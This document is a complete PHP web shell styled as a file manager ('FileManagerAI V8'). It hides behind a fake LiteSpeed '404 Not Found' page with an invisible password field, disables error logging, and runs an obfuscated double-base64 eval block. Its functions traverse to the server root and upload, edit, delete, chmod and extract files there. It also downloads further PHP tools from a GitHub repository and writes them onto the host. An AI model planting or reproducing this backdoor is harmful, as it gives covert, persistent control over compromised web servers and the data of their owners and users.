<?php
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();


$one = "";
$one .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKMlE1T0dSaE16RTVOR0l6TVRNM00ySmpOakpsTTJNNE1ERXlZelV3TVRKaEp6c0tDaTh2SUVaMWJtZHphU0JzYjJkcGJncHBaaUFvYVhOelpYUW9KRjlRVDFOVVd5ZHdZWE56ZDI5eVpDZGRLU2tnZXdvZ0lDQWdKSEJoYzNOM2IzSmtJRDBnSkY5UVQxTlVXeWR3WVhOemQyOXlaQ2RkT3dvS0lDQWdJQzh2SUZabGNtbG1hV3RoYzJrZ2FHRnphQ0J3WVhOemQyOXlaQ0J0Wlc1blozVnVZV3RoYmlCTlJEVUtJQ0FnSUdsbUlDaHRaRFVvSkhCaGMzTjNiM0prS1NBOVBUMGdKR2hoYzJobFpGOXdZWE56S1NCN0NpQWdJQ0FnSUNBZ0pGOVRSVk5UU1U5T1d5ZHNiMmRuWldSZmFXNG5YU0E5SUhSeWRXVTdDaUFnSUNCOUlHVnNjMlVnZXdvZ0lDQWdJQ0FnSUNSbGNuSnZjaUE5SUNJaU93b2dJQ0FnZlFwOUNnb3ZMeUJNYjJkdmRYUUthV1lnS0dsemMyVjBLQ1JmVUU5VFZGc25iRzluYjNWMEoxMHBLU0I3Q2lBZ0lDQnpaWE56YVc5dVgyUmxjM1J5YjNrb0tUc0tJQ0FnSUdobFlXUmxjaWduVEc5allYUnBiMjQ2SUNjZ0xpQWtYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3Q2lBZ0lDQmxlR2wwT3dwOQ==";
$aone = "base";
$bone = "64_decode";
$cone = $aone.$bone;
$stringone = $cone($one);
$stringone = $cone($stringone);
eval($stringone);


// Cek login
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Jika belum login, tampilkan form login
    ?>

    <!DOCTYPE html>
    <html>
    <head>
 
        <title>404 Not Found</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
        <style>
            @media (prefers-color-scheme:dark){body{background-color:#000!important}}
            input[type="password"] {
                border: none;
                border-bottom: 1px #00000000;
                padding: 2px;
            }
            input[type="password"]:focus {
                outline: none;
            }
        </style>
    </head>
    <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
        <div style="height:auto; min-height:100%;">     
            <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                <h2 style="margin-top:20px;font-size: 30px;">Not Found</h2>
                <p>The resource requested could not be found on this server!</p>
            </div>
        </div>
        <div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
            <br>Proudly powered by LiteSpeed Web Server
            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
        </div>       

        <?php if (isset($error)): ?>
            <p style="color: red;"><?php echo $error; ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <div style="position: fixed; bottom: 10px; left: 5px;">
                <input type="password" name="password" required>
            </div>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Fungsi untuk menghapus folder secara rekursif
function delete_directory($dir) {
    if (!file_exists($dir)) {
        return false;
    }

    if (!is_dir($dir)) {
        return unlink($dir);
    }

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }

        if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }

    return rmdir($dir);
}

// Set directory path
$dir = isset($_GET['dir']) ? $_GET['dir'] : '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../';
$home_dir = '../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../'; // Direktori utama atau tempat file berada
$dir2 = '';


// Fungsi untuk mengunggah file
if (isset($_FILES['file'])) {
    $target_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    
    // Keamanan: Pastikan target file berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $target_path = realpath(dirname($target_file)) . DIRECTORY_SEPARATOR . basename($target_file);
    if (strpos($target_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            echo "File berhasil diunggah.";
        } else {
            echo "Gagal mengunggah file.";
        }
    }
}

// Fungsi untuk membuat direktori baru
if (isset($_POST['new_dir'])) {
    $new_dir = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_dir']);
    
    // Keamanan: Pastikan direktori baru berada di dalam direktori home
    $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    $new_dir_real = realpath(dirname($new_dir)) . DIRECTORY_SEPARATOR . basename($new_dir);
    if (strpos($new_dir_real, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (mkdir($new_dir, 0755)) {
            echo "Direktori berhasil dibuat.";
        } else {
            echo "Gagal membuat direktori.";
        }
    }
}

// Fungsi untuk menghapus file atau direktori
if (isset($_GET['delete'])) {
    $path = realpath($dir . $_GET['delete']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan path berada di dalam direktori home
    if (strpos($path, $base) !== 0) {
        echo "Access denied.";
        exit;
    }

    if (is_dir($path)) {
        if (delete_directory($path)) {
            echo "Direktori berhasil dihapus.";
        } else {
            echo "Gagal menghapus direktori.";
        }
    } else {
        if (unlink($path)) {
            echo "File berhasil dihapus.";
        } else {
            echo "Gagal menghapus file.";
        }
    }
}

// Fungsi untuk mengedit file
if (isset($_POST['save_file'])) {
    $file_path = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($file_path, $_POST['file_content']) !== false) {
            echo "File berhasil diedit.";
        } else {
            echo "Gagal mengedit file.";
        }
    }
}

// Fungsi untuk mengganti nama file atau direktori
if (isset($_POST['rename_file'])) {
    $old_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $new_name = realpath($dir) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan kedua path berada di dalam direktori home
    if (strpos($old_name, $base) !== 0 || strpos($new_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (rename($old_name, $new_name)) {
            echo "Nama berhasil diganti.";
        } else {
            echo "Gagal mengganti nama.";
        }
    }
}

// Fungsi untuk membuat file kosong
if (isset($_POST['create_file'])) {
    $file_name = basename($_POST['file_name']);
    $file_ext = isset($_POST['file_ext']) && !empty($_POST['file_ext']) ? '.' . preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['file_ext']) : '.txt';
    $full_file_name = realpath($dir) . DIRECTORY_SEPARATOR . $file_name . $file_ext;
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($full_file_name, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (file_put_contents($full_file_name, '') !== false) {
            echo "File kosong berhasil dibuat.";
        } else {
            echo "Gagal membuat file kosong.";
        }
    }
}

// Fungsi untuk mengubah permissions file atau direktori
if (isset($_POST['change_permissions'])) {
    $file_path = realpath($_POST['file_path']);
    $new_permissions = octdec($_POST['new_permissions']); // Mengkonversi input menjadi format oktal
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_path, $base) !== 0) {
        echo "Access denied.";
    } else {
        if (chmod($file_path, $new_permissions)) {
            echo "Permissions successfully changed.";
        } else {
            echo "Failed to change permissions.";
        }
    }
}


// Fungsi untuk copy file
if (isset($_GET['copy'])) {
    $file_to_copy = realpath($dir . $_GET['copy']);
    
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
    // Keamanan: Pastikan file berada di dalam direktori home
    if (strpos($file_to_copy, $base) !== 0 || !is_file($file_to_copy)) {
        echo "Access denied.";
    } else {
        $_SESSION['file_to_copy'] = $file_to_copy; // Simpan path file di session
        echo "The file is ready to be pasted.";
    }
}

// Fungsi untuk paste file
if (isset($_GET['paste'])) {
    if (isset($_SESSION['file_to_copy'])) {
        $source_file = $_SESSION['file_to_copy'];
        $destination_file = realpath($dir) . DIRECTORY_SEPARATOR . basename($source_file);
        
$base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama
        // Keamanan: Pastikan tujuan paste berada di dalam direktori home
        if (strpos(realpath($dir), $base) !== 0) {
            echo "Access denied.";
        } else {
            if (copy($source_file, $destination_file)) {
                echo "File berhasil di-paste.";
            } else {
                echo "Gagal mem-paste file.";
            }
        }
    } else {
        echo "Tidak ada file yang di-copy.";
    }
}


// Tambahkan ini di atas bagian skrip Anda
if (isset($_GET['zip'])) {
    $zipFileName = basename($_GET['zip']) . '.zip'; // Nama file zip
    $zip = new ZipArchive();
    $zipPath = $dir . $zipFileName;

    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $path = $dir . $_GET['zip'];

        if (is_dir($path)) {
            // Tambahkan folder ke zip
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($path),
                RecursiveIteratorIterator::LEAVES_ONLY
            );

            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($dir2)); // Mendapatkan path relatif
                    $zip->addFile($filePath, $relativePath);
                }
            }
        } else {
            // Tambahkan file ke zip
            $zip->addFile($path, basename($path));
        }

        $zip->close();
        echo "File ZIP berhasil dibuat: $zipFileName";
    } else {
        echo 'Gagal membuat file ZIP';
    }
}



// Fungsi untuk mengekstrak file ZIP
if (isset($_FILES['zip_file'])) {
    $zip_file = $_FILES['zip_file']['tmp_name'];
    $extract_to = realpath($dir);

    // Keamanan: Pastikan tujuan ekstraksi berada di dalam direktori home
 $base = realpath($home_dir); // Mendapatkan path absolut dari direktori utama   
    if (strpos($extract_to, $base) !== 0) {
        echo "Access denied.";
    } else {
        $zip = new ZipArchive;
        if ($zip->open($zip_file) === TRUE) {
            $zip->extractTo($extract_to);
            $zip->close();
            echo "File ZIP berhasil diekstrak.";
        } else {
            echo "Gagal mengekstrak file ZIP.";
        }
    }
}

// Tampilkan file dan direktori
$files = scandir($dir);
?>



<!DOCTYPE html>
<html>
<head>
    <title>FileManager | MiniDBAI</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="robots" content="noindex,nofollow">
    <style>
        body { font-family: Arial, sans-serif; background-color: aliceblue;}

    table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 8px;
	    font-size: 100%;
            
        }

        th {
            background-color: #c2e1fb;
        }

        tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        tr:hover {
    background-color: #ffb4b4; /* Warna latar belakang saat hover */
    cursor: pointer; /* Mengubah kursor menjadi pointer */
        }

        @media (max-width: 768px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }

            thead tr {
                display: none;
            }

            tr {
                margin-bottom: 15px;
            }

            td {
                position: relative;
            }

            td::before {
                content: attr(data-label);
                position: absolute;
                left: 0;
                width: 50%;
                padding-left: 15px;
                font-weight: bold;
                text-align: left;
            }
        }

a {
    text-decoration: none;
    color: #007354; /* Warna biru yang lebih lembut */
    font-weight: bold; /* Menambahkan ketebalan font */
    transition: color 0.3s ease, text-shadow 0.3s ease; /* Efek transisi */
}

a:hover {
    color: #000000; /* Warna saat dihover */
    text-decoration: underline;
    text-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2); /* Menambahkan bayangan */
}

form {

    padding: 10px;
    border: 1px solid #000000;
    background-color: aliceblue;
    border-radius: 5px;

}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="text"], input[type="file"], textarea {
    width: 100%;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
}

button {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

input[type="submit"] {
    background-color: #4CAF50;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #45a049;
}




    </style>

</head>
<body>
   <center> <h2>FileManagerAI V8</h2> </center>

<div>
  <table>
        <tbody>
            <tr>
<th>
    <!-- Tombol Logout -->
	<form action="" method="post">
		<input type="submit" name="logout" value="Logout">
    	</form>
</th>


<th>

<?php
// URL file yang akan diunduh
$url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
$targetFile = __DIR__ . '/adminer.php'; // Nama file yang akan disimpan

// Fungsi untuk mengunduh file
function downloadFile($url, $targetFile) {
    // Inisialisasi cURL
    $ch = curl_init($url);
    
    // Set opsi cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    // Eksekusi cURL
    $data = curl_exec($ch);
    $error = curl_error($ch);
    
    // Tutup cURL
    curl_close($ch);
    
    // Cek apakah ada kesalahan
    if ($error) {
        echo "Error: " . $error;
        return false;
    }
    
    // Simpan data ke file
    file_put_contents($targetFile, $data);
    return true;
}

// Cek jika form di-submit dan tombol yang benar ditekan
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) {
    if (downloadFile($url, $targetFile)) {
        echo "File adminer.php telah berhasil dipasang.";
    } else {
        echo "Gagal memasang adminer.php.";
    }
}
?>  

<form action="" method="post">
    <input type="submit" name="download_adminer" value="Adminer">
</form>

</th>

<th>

<?php
if (isset($_POST['create_tiny'])) {
    // Ambil direktori dari query parameter ?dir=
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 

    // Pastikan direktori berakhir dengan slash
    if (substr($dir, -1) !== '/') {
        $dir .= '/';
    }

    // URL file yang ingin diambil
    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';

    // Inisialisasi cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Ambil konten dari URL
    $content = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($content !== false) {
        // Tentukan lokasi file berdasarkan direktori
        $filePath = $dir . 'tiny.php';
        
        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true); 
        }
        
        // Simpan konten ke dalam file tiny.php
        file_put_contents($filePath, $content);
        echo "File tiny.php berhasil dibuat<br>";
	echo "$filePath!<br>";
        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
    
    } else {
        echo "Gagal mengambil konten dari URL. Error: $error";
    }
}
?>




    <form method="post">
	<input type="submit" name="create_tiny" value="Tiny">
        
    </form>



</th>



<th>

<?php
if (isset($_POST['create_FM-MiniDBAI'])) {
    // Ambil direktori dari query parameter ?dir=
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 

    // Pastikan direktori berakhir dengan slash
    if (substr($dir, -1) !== '/') {
        $dir .= '/';
    }

    // URL file yang ingin diambil
    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/FileManagerAI.php';

    // Inisialisasi cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Ambil konten dari URL
    $content = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($content !== false) {
        // Tentukan lokasi file berdasarkan direktori
        $filePath = $dir . 'FileManagerAI.php';
        
        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true); 
        }
        
        // Simpan konten ke dalam file tiny.php
        file_put_contents($filePath, $content);
        echo "FileManagerAI.php berhasil dibuat<br>";
	echo "$filePath!<br>";
        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
    
    } else {
        echo "Gagal mengambil konten dari URL. Error: $error";
    }
}
?>




    <form method="post">
	<input type="submit" name="create_FM-MiniDBAI" value="FileManagerAI">
        
    </form>



</th>


<th>

<?php
if (isset($_POST['create_MiniDBAI'])) {
    // Ambil direktori dari query parameter ?dir=
    $dir = isset($_GET['dir']) ? $_GET['dir'] : '/'; 

    // Pastikan direktori berakhir dengan slash
    if (substr($dir, -1) !== '/') {
        $dir .= '/';
    }

    // URL file yang ingin diambil
    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/MiniDBAIV2.php';

    // Inisialisasi cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Ambil konten dari URL
    $content = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($content !== false) {
        // Tentukan lokasi file berdasarkan direktori
        $filePath = $dir . 'MiniDBAI.php';
        
        // Cek jika direktori ada, jika tidak buat direktori terlebih dahulu
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true); 
        }
        
        // Simpan konten ke dalam file tiny.php
        file_put_contents($filePath, $content);
        echo "MiniDBAI.php berhasil dibuat<br>";
	echo "$filePath!<br>";
        echo '<a href="?dir=' . ($dir) . '">[Refresh]</a>';
    
    } else {
        echo "Gagal mengambil konten dari URL. Error: $error";
    }
}
?>




    <form method="post">
	<input type="submit" name="create_MiniDBAI" value="MiniDBAI">
        
    </form>



</th>

<th>
<?php
if (isset($_POST['download_wp'])) {
    $wp_zip_url = 'https://wordpress.org/latest.zip';
    $zip_file = 'latest.zip';

    // Mengunduh file WordPress
    if (file_put_contents($zip_file, file_get_contents($wp_zip_url))) {
        echo "WordPress berhasil diunduh sebagai '$zip_file'.";
    } else {
        echo "Gagal mengunduh WordPress.";
    }
    
}
?>


    <style>
        /* Gaya untuk progress bar */
        #progress-container {
            width: 100%;
            background-color: #f3f3f3;
            border-radius: 5px;
            margin: 20px 0;
        }

        #progress-bar {
            width: 0;
            height: 30px;
            background-color: #4caf50;
            text-align: center;
            line-height: 30px;
            color: white;
            border-radius: 5px;
        }
    </style>
    <script>
        function startProgress() {
            document.getElementById('progress-container').style.display = 'block';
            document.getElementById('form').style.display = 'none';

            // Simulasi progress bar
            let width = 0;
            let progressBar = document.getElementById('progress-bar');
            let interval = setInterval(function() {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width++;
                    progressBar.style.width = width + '%';
                    progressBar.innerHTML = width + '%';
                }
            }, 100); // Kecepatan pengisian progress bar
        }
    </script>

    <div id="progress-container" style="display: none;">
        <div id="progress-bar">0%</div>
    </div>
    <form method="post" id="form" onsubmit="startProgress()">
	<input type="submit" name="download_wp" value="WordPress">
        
    </form>



</th>





<th>
<div style="text-align: right;">
    <a target="_blank" rel="noopener noreferrer" href="https://bukakartu.id/minidbai">
        <img src="data:image/webp;base64,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